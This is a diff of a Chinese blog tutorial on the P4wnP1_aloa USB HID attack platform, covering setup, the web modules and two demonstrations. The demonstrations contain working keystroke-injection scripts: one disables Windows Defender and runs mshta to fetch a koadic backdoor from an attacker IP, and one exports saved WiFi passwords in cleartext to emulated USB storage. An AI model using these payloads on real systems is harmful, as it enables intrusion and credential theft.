@@ -13,10 +13,32 @@
 <meta property="og:site_name" content="漏断&#39;s Blog">
 <meta property="og:description" content="前言 P4wnP1基于树莓派zero (w)，是一个快捷高效的HID攻击平台，可以进行Windows密码破解、HID隐藏信道后门、模块化USB设备模拟等，于2017年2月第一次发布，现在主要开发者已停止对其开发，全力开发它的升级版——P4wnP1_aloa。P4wnP1_aloa也是基于树莓派zero w，与P4wnP1善于高效攻击相比，P4wnP1_aloa更注重HID测试，提供web客户端，调">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-01-22T06:48:43.482Z">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/rpi0w.jpg">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/wifi_connect.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack5.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/ssh.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/web_client.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/trigger.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/usb.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/wifi.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/bluetooth.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/network.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/generic.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack0.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack1.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack5.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack2.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack4.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack3.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack8.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack7.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack6.png">
+<meta property="og:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack9.png">
+<meta property="og:updated_time" content="2019-01-22T07:14:54.027Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="如何用P4wnP1_aloa进行HID攻击">
 <meta name="twitter:description" content="前言 P4wnP1基于树莓派zero (w)，是一个快捷高效的HID攻击平台，可以进行Windows密码破解、HID隐藏信道后门、模块化USB设备模拟等，于2017年2月第一次发布，现在主要开发者已停止对其开发，全力开发它的升级版——P4wnP1_aloa。P4wnP1_aloa也是基于树莓派zero w，与P4wnP1善于高效攻击相比，P4wnP1_aloa更注重HID测试，提供web客户端，调">
+<meta name="twitter:image" content="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/rpi0w.jpg">
   
     <link rel="alternative" href="/atom.xml" title="漏断&#39;s Blog" type="application/atom+xml">
   
@@ -272,26 +294,34 @@
 <hr>
 <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先到P4wnP1_aloa的<a href="https://github.com/mame82/P4wnP1_aloa/releases" target="_blank" rel="noopener">releases页面</a>下载镜像文件。P4wnP1的系统基于Raspbian，而P4wnP1_aloa则基于kali，内置了很多安全工具（kali的<a href="https://www.offensive-security.com/kali-linux-arm-images/" target="_blank" rel="noopener">官方下载页</a>也有P4wnP1镜像，但要注意是原版P4wnP1，而非本篇介绍的P4wnP1_aloa）。</p>
 <p>解压压缩文件，用Etcher或win32DiskImager（笔者使用的是Etcher）将得到的img镜像文件写入micro SD卡（8G够用）。</p>
-<p>将micro SD卡插入树莓派zero w，电源连接标有PWR（远离CPU的那个）的usb接口，指示灯闪烁表明上电成功。</p>
-<p>电脑或手机查看WIFI热点，若出现名字中含有P4wnP1的热点则启动完成。连接热点，密码MaMe82-P4wnP1。<br>由于P4wnP1_aloa只是起了一个WiFi热点，没有真正接入互联网，因此会提示无网络。电脑连接建议使用两个网卡，一个用来连接P4wnP1_aloa，另一个访问Internet。</p>
-<p>连接完成后可以通过浏览器访问 <a href="http://172.24.0.1:8000" target="_blank" rel="noopener">http://172.24.0.1:8000</a> 进入P4wnP1_aloa的web控制界面（<em>注意关闭代理，否则无法访问</em>）。也可以通过172.24.0.1的22端口进行ssh连接，默认用户名root，密码toor。</p>
+<p>将micro SD卡插入树莓派zero w，电源连接标有PWR（远离CPU的那个）的usb接口，指示灯闪烁表明上电成功。<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/rpi0w.jpg" alt="image"></p>
+<p>电脑或手机查看WIFI热点，若出现名字中含有P4wnP1的热点则启动完成。连接热点，密码MaMe82-P4wnP1。<br>由于P4wnP1_aloa只是起了一个WiFi热点，没有真正接入互联网，因此会提示无网络。电脑连接建议使用两个网卡，一个用来连接P4wnP1_aloa，另一个访问Internet。<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/wifi_connect.png" alt="image"></p>
+<p>连接完成后可以通过浏览器访问 <a href="http://172.24.0.1:8000" target="_blank" rel="noopener">http://172.24.0.1:8000</a> 进入P4wnP1_aloa的web控制界面（<em>注意关闭代理，否则无法访问</em>）。也可以通过172.24.0.1的22端口进行ssh连接，默认用户名root，密码toor。<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack5.png" alt="image"></p>
+<p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/ssh.png" alt="image"></p>
 <p>P4wnP1_aloa的安装至此结束。</p>
 <hr>
 <h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="web端"><a href="#web端" class="headerlink" title="web端"></a>web端</h3><p>P4wnP1_aloa的web端实现了大部分功能（比ssh端能做的还要多！）下面依次介绍各模块（作者称之为模板template）。</p>
-<h5 id="HIDScript"><a href="#HIDScript" class="headerlink" title="HIDScript"></a>HIDScript</h5><p>基于JavaScript，可以在提供的编辑器中进行修改、保存、加载已保存的脚本。内置一些控制函数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">layout(<span class="string">'us'</span>); <span class="comment">//键盘布局，国内一般us</span></span><br><span class="line">typingSpeed(标准间隔,随机值); <span class="comment">//ms为单位，每个操作间的时间间隔</span></span><br><span class="line">delay(时间值); <span class="comment">//ms为单位，等待一定时间</span></span><br><span class="line">type(<span class="string">'xxxxx\n'</span>); <span class="comment">//输入字符串，注意是敲击按键，大小写无保证</span></span><br><span class="line">press(<span class="string">'GUI X'</span>); <span class="comment">//按下按键再自动松开 </span></span><br><span class="line">moveStepped(x,y); <span class="comment">//鼠标相对运动</span></span><br><span class="line">moveTo(x,y); <span class="comment">//鼠标移动到绝对位置</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="comment">//定义函数</span></span><br><span class="line">&#125;</span><br><span class="line">waitLEDRepeat(NUM);	<span class="comment">//等待连按num lock键，可以识别CAPS等按键，实现逻辑控制</span></span><br></pre></td></tr></table></figure></p>
+<h5 id="HIDScript"><a href="#HIDScript" class="headerlink" title="HIDScript"></a>HIDScript</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/web_client.png" alt="image"></p>
+<p>基于JavaScript，可以在提供的编辑器中进行修改、保存、加载已保存的脚本。内置一些控制函数。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">layout(<span class="string">'us'</span>); <span class="comment">//键盘布局，国内一般us</span></span><br><span class="line">typingSpeed(标准间隔,随机值); <span class="comment">//ms为单位，每个操作间的时间间隔</span></span><br><span class="line">delay(时间值); <span class="comment">//ms为单位，等待一定时间</span></span><br><span class="line">type(<span class="string">'xxxxx\n'</span>); <span class="comment">//输入字符串，注意是敲击按键，大小写无保证</span></span><br><span class="line">press(<span class="string">'GUI X'</span>); <span class="comment">//按下按键再自动松开 </span></span><br><span class="line">moveStepped(x,y); <span class="comment">//鼠标相对运动</span></span><br><span class="line">moveTo(x,y); <span class="comment">//鼠标移动到绝对位置</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="comment">//定义函数</span></span><br><span class="line">&#125;</span><br><span class="line">waitLEDRepeat(NUM);	<span class="comment">//等待连按num lock键，可以识别CAPS等按键，实现逻辑控制</span></span><br></pre></td></tr></table></figure></p>
 <p>有了HIDscript，可以很方便的把RubberDucky的脚本迁移到P4wnP1_aloa平台上。但尚且无法完成BashBunny的很多功能，下文将进一步介绍如何通过master template实现BashBunny的大部分功能。</p>
-<h5 id="Trigger-Action"><a href="#Trigger-Action" class="headerlink" title="Trigger Action"></a>Trigger Action</h5><p>触发机制，通过一项事件触发一项或多项操作。</p>
+<h5 id="Trigger-Action"><a href="#Trigger-Action" class="headerlink" title="Trigger Action"></a>Trigger Action</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/trigger.png" alt="image"></p>
+<p>触发机制，通过一项事件触发一项或多项操作。</p>
 <p>触发条件包括：服务启动、USB连接、USB断开、WIFI热点启动、连接已有热点、GPOI输入等。其中GPOI输入是利用了树莓派的特点定制的。</p>
 <p>执行事件包括：打印log、（kali系统）运行bash脚本、运行HIDScript、加载并部署模板、GPIO输出等。</p>
 <p>配置全部以下拉选项提供给用户，避免了错误输入带来的效率降低，也更加直观易读。</p>
 <p>One shot设定，开启后触发机制只触发一次，随后不再触发。</p>
-<h5 id="USB-Settings"><a href="#USB-Settings" class="headerlink" title="USB Settings"></a>USB Settings</h5><p>进行USB设置，包括销售商ID、制作者ID、产品ID、序列号等。</p>
+<h5 id="USB-Settings"><a href="#USB-Settings" class="headerlink" title="USB Settings"></a>USB Settings</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/usb.png" alt="image"></p>
+<p>进行USB设置，包括销售商ID、制作者ID、产品ID、序列号等。</p>
 <p>还可对模拟的项目进行选择，包括CDC ECM（针对UNIX Linux OSX的USB网络）、RNDIS（针对Windows的USB网络）、键盘、鼠标、一般USB设备、序列化接口、存储设备（模拟大小、名称等需要通过ssh端进行设定）。</p>
-<h5 id="WIFI-Settings"><a href="#WIFI-Settings" class="headerlink" title="WIFI Settings"></a>WIFI Settings</h5><p>设定WIFI名称、信道、加密、地区、工作模式（AP或客户端）、是否隐藏SSID（在长期攻击中比较有用，能发现隐藏热点的目标一般也很容易发现正受到HID攻击）</p>
-<h5 id="Bluetooth-Settings"><a href="#Bluetooth-Settings" class="headerlink" title="Bluetooth Settings"></a>Bluetooth Settings</h5><p>蓝牙设置，目前没怎么用到，对连接设备限制比较大，且效率没有WIFI高</p>
-<h5 id="Network-Settings"><a href="#Network-Settings" class="headerlink" title="Network Settings"></a>Network Settings</h5><p>网络设置，可以设定网卡、工作模式、DHCP服务等</p>
+<h5 id="WIFI-Settings"><a href="#WIFI-Settings" class="headerlink" title="WIFI Settings"></a>WIFI Settings</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/wifi.png" alt="image"></p>
+<p>设定WIFI名称、信道、加密、地区、工作模式（AP或客户端）、是否隐藏SSID（在长期攻击中比较有用，能发现隐藏热点的目标一般也很容易发现正受到HID攻击）</p>
+<h5 id="Bluetooth-Settings"><a href="#Bluetooth-Settings" class="headerlink" title="Bluetooth Settings"></a>Bluetooth Settings</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/bluetooth.png" alt="image"></p>
+<p>蓝牙设置，目前没怎么用到，对连接设备限制比较大，且效率没有WIFI高</p>
+<h5 id="Network-Settings"><a href="#Network-Settings" class="headerlink" title="Network Settings"></a>Network Settings</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/network.png" alt="image"></p>
+<p>网络设置，可以设定网卡、工作模式、DHCP服务等</p>
 <h5 id="Event-Log"><a href="#Event-Log" class="headerlink" title="Event Log"></a>Event Log</h5><p>事件日志，在测试配置时可以检查trigger条件是否被触发，注意刷新页面时会重置</p>
-<h5 id="Generic-Settings"><a href="#Generic-Settings" class="headerlink" title="Generic Settings"></a>Generic Settings</h5><p>以上各种设定可以保存到文件，并在后面的使用中直接套用，因此作者称之为template（模板），Generic Settings则可以对这些模板进行管理，直接部署。此外，在这项设置中还可以将不同模板的组合方式单独保存，形成作者所说的master template（主模板），进行一键部署，实现类似BashBunny的功能（BashBunny是将系统层的配置和HID攻击命令写在同一个脚本中，P4wnP1_aloa则通过模块组合实现）。</p>
+<h5 id="Generic-Settings"><a href="#Generic-Settings" class="headerlink" title="Generic Settings"></a>Generic Settings</h5><p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/generic.png" alt="image"></p>
+<p>以上各种设定可以保存到文件，并在后面的使用中直接套用，因此作者称之为template（模板），Generic Settings则可以对这些模板进行管理，直接部署。此外，在这项设置中还可以将不同模板的组合方式单独保存，形成作者所说的master template（主模板），进行一键部署，实现类似BashBunny的功能（BashBunny是将系统层的配置和HID攻击命令写在同一个脚本中，P4wnP1_aloa则通过模块组合实现）。</p>
 <p>每次开机时加载的模板就是master template，也可以在Generic Settings中进行设置。</p>
 <p>一定要检查WIFI模板的配置，防止无法连接。</p>
 <p>备份与恢复功能，通过数据库进行备份、恢复。</p>
@@ -313,20 +343,23 @@
 <p>已知弹起键盘的KeyCode为”\x00\x00\x00\x00\x00\x00\x00\x00”，则可以通过写一个shell脚本进行测试<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">sleep 3</span><br><span class="line">for keycode in &#123;10..25&#125;</span><br><span class="line">do</span><br><span class="line">	echo -ne "\x00\x00\x00\x$&#123;keycode&#125;\x00\x00\x00\x00" &gt; /dev/hidg0</span><br><span class="line">       	echo -ne "\x00\x00\x00\x00\x00\x00\x00\x00" &gt; /dev/hidg0</span><br><span class="line">	sleep 0.2</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
 <p>上面的脚本实现的效果：等待3秒后依次按下mnopqrstuv345678，按键间隔0.2秒。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# chmod +x test.sh</span><br><span class="line">root@kali:~# ./test.sh</span><br><span class="line">mnopqrstuv345678root@kali:~# mnopqrstuv345678</span><br></pre></td></tr></table></figure></p>
 <hr>
-<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><p>同一局域网远程控制目标电脑。</p>
-<p>设备：目标机器（IP：192.168.1.108，本机）、攻击机器（IP：192.168.1.109，桥接模式联网的虚拟机）、P4wnP1_aloa(本机登陆web端进行控制)</p>
-<p>先在攻击机器上配置koadic</p>
-<p>在P4wnP1_aloa中写好脚本<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">layout(<span class="string">'us'</span>);</span><br><span class="line">typingSpeed(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">waitLEDRepeat(NUM);</span><br><span class="line">press(<span class="string">"GUI R"</span>);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">type(<span class="string">"powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs\n"</span>);</span><br><span class="line">delay(<span class="number">2000</span>);</span><br><span class="line">press(<span class="string">"ALT Y"</span>);</span><br><span class="line">delay(<span class="number">5000</span>);</span><br><span class="line">press(<span class="string">"GUI R"</span>);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">type(<span class="string">"mshta http://192.168.1.109:9999/lyrCZ\n"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>这段脚本会先关闭Win10的Defender，再获取后门程序并执行。连续快按num lock键触发操作</p>
-<p>攻击机器得到回显</p>
-<p>由于是笔者日常使用的电脑，不做太多攻击测试</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><p>同一局域网内（外网也行）控制目标电脑。</p>
+<p>设备：目标机器（IP：192.168.1.108，本机）、攻击机器（IP：192.168.1.109，桥接模式联网的虚拟机）、P4wnP1_aloa(本机登陆web端进行控制)<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack0.png" alt="image"></p>
+<p>先在攻击机器上配置koadic<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack1.png" alt="image"></p>
+<p>在P4wnP1_aloa中写好脚本<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack5.png" alt="image"><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">layout(<span class="string">'us'</span>);</span><br><span class="line">typingSpeed(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">waitLEDRepeat(NUM);</span><br><span class="line">press(<span class="string">"GUI R"</span>);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">type(<span class="string">"powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs\n"</span>);</span><br><span class="line">delay(<span class="number">2000</span>);</span><br><span class="line">press(<span class="string">"ALT Y"</span>);</span><br><span class="line">delay(<span class="number">5000</span>);</span><br><span class="line">press(<span class="string">"GUI R"</span>);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">type(<span class="string">"mshta http://192.168.1.109:9999/lyrCZ\n"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这段脚本会先关闭Win10的Defender，再获取后门程序并执行。连续快按num lock键触发操作。</p>
+<p>攻击机器得到回显<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack2.png" alt="image"></p>
+<p>由于是笔者日常使用的电脑，不做太多攻击测试<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack4.png" alt="image"></p>
+<p><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack3.png" alt="image"></p>
 <h3 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h3><p>获取电脑保存的WiFi密码</p>
-<p>开启Mass Storage模拟，选择默认的test.bin镜像，不要忘了点击左上角deploy进行部署。</p>
-<p>使用HIDScript，这段脚本是笔者从BashBunny的payload WiPassDump改写得到的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">layout(<span class="string">'us'</span>);</span><br><span class="line">typingSpeed(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">waitLEDRepeat(NUM);</span><br><span class="line">press(<span class="string">"GUI R"</span>);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">type(<span class="string">"powershell -WindowStyle Hidden $bunny=(gwmi win32_volume -f 'label=\\\"README\\\"').NAME; cd $bunny; netsh wlan export profile key=clear\n"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>USB连接目标电脑，电脑将P4wnP1_aloa识别为U盘，连续快按num lock键触发操作</p>
-<p>可以看到U盘里保存了电脑存储的WiFi密码</p>
+<p>开启Mass Storage模拟，选择默认的test.bin镜像，不要忘了点击左上角deploy进行部署。<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack8.png" alt="image"></p>
+<p>使用HIDScript，这段脚本是对BashBunny的payload WiPassDump进行改写得到的<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack7.png" alt="image"><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">layout(<span class="string">'us'</span>);</span><br><span class="line">typingSpeed(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">waitLEDRepeat(NUM);</span><br><span class="line">press(<span class="string">"GUI R"</span>);</span><br><span class="line">delay(<span class="number">500</span>);</span><br><span class="line">type(<span class="string">"powershell -WindowStyle Hidden $bunny=(gwmi win32_volume -f 'label=\\\"README\\\"').NAME; cd $bunny; netsh wlan export profile key=clear\n"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>USB连接目标电脑，电脑将P4wnP1_aloa识别为U盘，连续快按num lock键触发操作。<br>可以看到U盘里保存了电脑存储的WiFi密码。<br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack6.png" alt="image"><br><img src="https://github.com/Houwenda/houwenda.github.io/raw/master/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/pics/attack9.png" alt="image"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
 <p>P4wnP1_aloa相比于P4wnP1，在可玩性上有很大提升，可以实现更多更复杂的攻击，当然，对一些简单高效的攻击来说使用原版P4wnP1可以减少操作步骤。P4wnP1_aloa由树莓派zero w搭载，成本比99美刀的BashBunny低很多（跟teensy等badusb比就没意思了，毕竟功能摆在这）。中文输入法对HID攻击干扰较大，尚且没找到好的解决方案。</p>
+</blockquote>
+<blockquote>
+<p>参考链接：<br><a href="http://shumeipai.nxez.com/2018/06/26/using-raspberry-pi-zero-to-implement-new-bad-usb-with-echo.html" target="_blank" rel="noopener">http://shumeipai.nxez.com/2018/06/26/using-raspberry-pi-zero-to-implement-new-bad-usb-with-echo.html</a></p>
 </blockquote>
 
       
@@ -386,7 +419,7 @@
         <p><span>本文标题:</span><a href="/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/">如何用P4wnP1_aloa进行HID攻击</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 漏断 的个人博客">漏断</a></p>
         <p><span>发布时间:</span>2019年01月22日 - 08时45分</p>
-        <p><span>最后更新:</span>2019年01月22日 - 14时48分</p>
+        <p><span>最后更新:</span>2019年01月22日 - 15时14分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/" title="如何用P4wnP1_aloa进行HID攻击">http://houwenda.github.io/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/</a>
             <span class="copy-path" data-clipboard-text="原文: http://houwenda.github.io/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/　　作者: 漏断" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
